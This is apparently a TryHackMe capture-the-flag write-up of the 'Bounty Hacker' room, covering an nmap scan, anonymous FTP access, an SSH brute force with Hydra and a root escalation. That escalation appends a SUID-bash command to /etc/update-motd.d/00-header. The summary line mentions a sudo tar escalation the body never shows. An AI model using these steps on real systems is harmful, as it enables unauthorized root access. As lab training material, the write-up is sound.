---
title: "Bounty Hacker THM"
date: 2025-12-19 12:00:00 +0300
categories: [Writeups, TryHackMe]
tags: [tryhackme, ctf, writeup, pentesting, security]
description: "Anonymous FTP file retrieval, Hydra SSH password cracking, and sudo tar command privilege escalation."
image:
  path: /assets/img/posts/bounty_hacker_thm.jpeg
  alt: Bounty Hacker THM
---

# Enumaration

## nmap

```jsx
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 05:59 EST
Nmap scan report for 10.10.201.83
Host is up (0.26s latency).
Not shown: 969 filtered tcp ports (no-response), 28 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.23.176.115
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:9c:fb:fe:b4:fe:74:1a:2c:4f:6b:88:79:7c:a4:d5 (RSA)
|   256 99:4d:15:bd:ca:24:db:20:29:03:21:47:a0:36:09:66 (ECDSA)
|_  256 25:b7:85:9b:60:60:93:79:79:bb:9a:88:be:94:76:72 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.89 seconds
                                                                
                                                                
```

first thing i check was ftp version, nothing comes out though.

we check anonymous and we see 2 files

```jsx
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

first one seems to be passlist

second one is 

```jsx
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

since there is only 3 ports, we try to bruteforce with hydra into ssh with these informations.

we found a match.

we login

get the user.txt

i do not know how to go on, there isnt seem to be an hint. so i set [linpeas.sh](http://linpeas.sh) and run it

we can see couple of vulnerabilites. i just pick one of them

and run this

```jsx
lin@ip-10-10-201-83:/tmp$ echo "cp /bin/bash /home/lin/bash && chmod u+s /home/lin/bash" >> /etc/update-motd.d/00-header   

```

then

```jsx
lin@ip-10-10-201-83:~$ ./bash -p
bash-5.0# whoami
root

```
